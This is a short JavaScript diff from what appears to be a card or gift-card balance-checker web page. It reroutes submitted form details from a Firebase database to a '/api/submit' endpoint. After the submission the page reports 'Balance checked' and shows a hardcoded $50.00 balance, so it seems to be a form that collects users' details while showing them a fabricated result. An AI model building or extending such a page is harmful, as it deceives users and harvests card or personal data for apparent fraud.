@@ -129,7 +129,11 @@ document.addEventListener("DOMContentLoaded", () => {
       status.textContent = "Sending details...";
       console.log("Sending data to Firebase:", data);
 
-      await db.ref("submissions").push(data);
+        await fetch("/api/submit", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(data)
+});
 
       status.textContent = "Success! Balance checked.";
       document.getElementById("balanceText").textContent = "$50.00";
